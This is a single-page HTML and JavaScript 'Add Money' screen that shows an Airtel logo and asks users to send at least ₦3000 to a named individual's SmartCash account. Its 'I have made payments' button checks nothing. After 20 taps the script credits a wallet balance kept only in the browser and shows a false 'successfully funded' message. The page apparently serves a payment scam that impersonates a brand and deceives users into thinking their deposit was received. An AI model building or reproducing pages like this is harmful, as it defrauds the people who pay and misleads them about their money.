<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
  <title>Add Money</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #fff;
      overflow-x: hidden;
    }

    .animated-bg {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: url('airtel-logo.png') repeat;
      opacity: 0.05;
      z-index: 0;
      animation: moveBg 30s linear infinite;
    }

    @keyframes moveBg {
      0% { background-position: 0 0; }
      100% { background-position: 1000px 1000px; }
    }

    .container {
      position: relative;
      z-index: 1;
      padding: 30px 20px;
      text-align: center;
    }

    .logo {
      width: 80px;
      margin: 0 auto 20px;
      display: block;
    }

    .input-box {
      margin-top: 20px;
    }

    input[type="number"] {
      padding: 10px;
      width: 80%;
      font-size: 18px;
      border: 1px solid #ccc;
      border-radius: 10px;
      outline: none;
    }

    .continue-btn {
      margin-top: 20px;
      background-color: #d90000;
      color: white;
      padding: 12px 20px;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      cursor: pointer;
    }

    .account-details {
      display: none;
      margin-top: 30px;
      background: rgba(255, 255, 255, 0.9);
      padding: 20px;
      border-radius: 15px;
      box-shadow: 0 0 10px #ccc;
    }

    .account-details h3 {
      margin: 0 0 10px;
    }

    .pay-btn {
      margin-top: 15px;
      background-color: #d90000;
      color: white;
      padding: 12px 20px;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      cursor: pointer;
    }

    /* Pop-up */
    .popup {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0, 0, 0, 0.7);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 99;
    }

    .popup-content {
      background: #fff;
      padding: 25px;
      text-align: center;
      border-radius: 15px;
      width: 80%;
      box-shadow: 0 0 15px rgba(0,0,0,0.2);
    }

    .popup-content h2 {
      margin-top: 10px;
      font-size: 18px;
    }

    .popup-content img {
      width: 60px;
    }

    .popup-content button {
      margin-top: 15px;
      padding: 10px 20px;
      background: #d90000;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
    }

  </style>
</head>
<body>
  <div class="animated-bg"></div>

  <div class="container">
    <img src="airtel-logo.png" class="logo" alt="Logo" />
    <div class="input-box">
      <input type="number" id="amountInput" placeholder="Enter amount (₦3000 minimum)" />
      <br />
      <button class="continue-btn" onclick="proceed()">Continue</button>
    </div>

    <div class="account-details" id="accountBox">
      <h3>Send to:</h3>
      <p><b>EMMANUEL OKWUNNA</b></p>
      <p>SmartCash Payment Service Bank</p>
      <p>Account No: <b>812 489 0070</b></p>
      <button class="pay-btn" onclick="madePayment()">I have made payments</button>
    </div>
  </div>

  <!-- Popup -->
  <div class="popup" id="popup">
    <div class="popup-content">
      <img src="airtel-logo.png" alt="Logo" />
      <h2 id="popupMessage">Dear USERNAME, you have successfully funded your wallet with ₦3000.</h2>
      <button onclick="closePopup()">OK</button>
    </div>
  </div>

  <script>
    let tapCount = parseInt(localStorage.getItem('tapCount') || '0');
    let user = JSON.parse(localStorage.getItem('user')) || { name: "User", phone: "08000000000", balance: 0 };

    function proceed() {
      const amt = document.getElementById('amountInput').value;
      if (amt < 3000) {
        alert("Minimum amount is ₦3000");
        return;
      }
      document.getElementById('accountBox').style.display = 'block';
    }

    function madePayment() {
      tapCount++;
      localStorage.setItem('tapCount', tapCount);
      if (tapCount >= 20) {
        // Add ₦3000 to balance
        user.balance = (parseFloat(user.balance) || 0) + 3000;
        localStorage.setItem('user', JSON.stringify(user));
        localStorage.setItem('tapCount', 0);
        showPopup();
      } else {
        alert(`Tap count: ${tapCount}/20`);
      }
    }

    function showPopup() {
      const message = `Dear ${user.name.toUpperCase()}, you have successfully funded your wallet with ₦3000.`;
      document.getElementById('popupMessage').innerText = message;
      document.getElementById('popup').style.display = 'flex';
    }

    function closePopup() {
      document.getElementById('popup').style.display = 'none';
      window.location.href = "dashboard.html";
    }
  </script>
</body>
</html>
